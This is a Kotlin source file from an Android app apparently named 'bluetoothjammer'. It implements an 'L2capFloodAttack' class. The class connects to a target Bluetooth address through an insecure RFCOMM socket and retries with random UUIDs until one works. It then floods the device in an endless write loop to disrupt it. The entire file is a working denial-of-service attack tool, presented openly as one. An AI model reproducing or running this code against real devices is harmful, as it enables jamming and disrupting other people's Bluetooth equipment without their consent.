package com.eikarna.bluetoothjammer.api

import android.annotation.SuppressLint
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothManager
import android.bluetooth.BluetoothSocket
import android.content.Context
import android.widget.TextView
import androidx.core.content.ContextCompat.getSystemService
import com.eikarna.bluetoothjammer.AttackActivity
import com.google.android.material.textview.MaterialTextView
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import util.Logger
import java.io.IOException
import java.util.UUID

@SuppressLint("MissingPermission")
class L2capFloodAttack(private val targetAddress: String)
{
	// Константы
	companion object
	{
		private const val MAX_LOG_LINES = 100
		private const val DEFAULT_BUFFER_SIZE = 600
		private val BASE_UUID = UUID.fromString("00001105-0000-1000-8000-00805F9B34FB")
	}

	// Состояние
	private var bluetoothAdapter: BluetoothAdapter? = null
	private var activeSocket: BluetoothSocket? = null
	private var attackScope: CoroutineScope? = null
	private var shouldStop = false
	private val sendBuffer by lazy { createPayloadBuffer() }

	// Основной метод атаки
	fun startAttack(context: Context, logView: MaterialTextView)
	{
		initBluetooth(context)
		val targetDevice = getTargetDevice() ?: run {
			logError(context, logView, "Target device not found")
			return
		}

		shouldStop = false
		attackScope = CoroutineScope(Dispatchers.IO)

		attackScope?.launch {
			val uuid = establishConnection(targetDevice, context, logView) ?: return@launch

			if(activeSocket?.isConnected == true)
			{
				logSuccess(context, logView, "Connection established. Starting flood attack...")
				executeFloodAttack(logView)
			}
			else
			{
				logError(context, logView, "Failed to establish connection")
			}
		}
	}

	// Остановка атаки
	fun stopAttack()
	{
		shouldStop = true
		attackScope?.cancel()
		closeActiveConnection()
		bluetoothAdapter?.startDiscovery()
	}

	// Приватные вспомогательные методы
	private fun initBluetooth(context: Context)
	{
		val bluetoothManager = getSystemService(context, BluetoothManager::class.java)
		bluetoothAdapter = bluetoothManager?.adapter
	}

	private fun getTargetDevice(): BluetoothDevice?
	{
		return bluetoothAdapter?.getRemoteDevice(targetAddress)
	}

	private suspend fun establishConnection(
		device: BluetoothDevice,
		context: Context,
		logView: TextView
	): UUID?
	{
		var effectiveUUID = BASE_UUID

		while(!shouldStop)
		{
			try
			{
				activeSocket =
					device.createInsecureRfcommSocketToServiceRecord(effectiveUUID).apply {
						connect()
						if(isConnected) return effectiveUUID
					}
			}
			catch(e: IOException)
			{
				effectiveUUID = generateFallbackUuid()
				logConnectionAttempt(context, logView, effectiveUUID)
				delay(100) // Задержка между попытками
			}
		}
		return null
	}

	private fun executeFloodAttack(logView: TextView)
	{
		try
		{
			while(!shouldStop && activeSocket?.isConnected == true)
			{
				activeSocket?.outputStream?.write(sendBuffer)
			}
		}
		catch(e: IOException)
		{
			logView.post { Logger.appendLog(logView, "Flood error: ${e.message}") }
		}
		finally
		{
			closeActiveConnection()
		}
	}

	private fun closeActiveConnection()
	{
		try
		{
			activeSocket?.close()
		}
		catch(e: IOException)
		{
			// Игнорируем ошибки закрытия
		}
		finally
		{
			activeSocket = null
		}
	}

	// Генерация данных
	private fun createPayloadBuffer(): ByteArray
	{
		return ByteArray(DEFAULT_BUFFER_SIZE) { ((it % 40) + 'A'.code).toByte() }
	}

	private fun generateFallbackUuid(): UUID
	{
		return UUID.fromString(
			"${
				UUID.randomUUID().toString().split("-")[0]
			}-0000-1000-8000-00805F9B34FB"
		)
	}

	// Логирование
	private fun logConnectionAttempt(context: Context, logView: TextView, uuid: UUID)
	{
		if(AttackActivity.loggingStatus)
		{
			(context as? AttackActivity)?.runOnUiThread {
				purgeOldLogs(logView)
				Logger.appendLog(logView, "Connection failed, trying UUID: $uuid")
			}
		}
	}

	private fun logSuccess(context: Context, logView: TextView, message: String)
	{
		if(AttackActivity.loggingStatus)
		{
			(context as? AttackActivity)?.runOnUiThread {
				purgeOldLogs(logView)
				Logger.appendLog(logView, message)
			}
		}
	}

	private fun logError(context: Context, logView: TextView, message: String)
	{
		(context as? AttackActivity)?.runOnUiThread {
			purgeOldLogs(logView)
			Logger.appendLog(logView, "ERROR: $message")
		}
	}

	private fun purgeOldLogs(logView: TextView)
	{
		val lines = logView.text.split("\n")
		if(lines.size > MAX_LOG_LINES)
		{
			logView.text = lines.takeLast(MAX_LOG_LINES).joinToString("\n")
		}
	}
}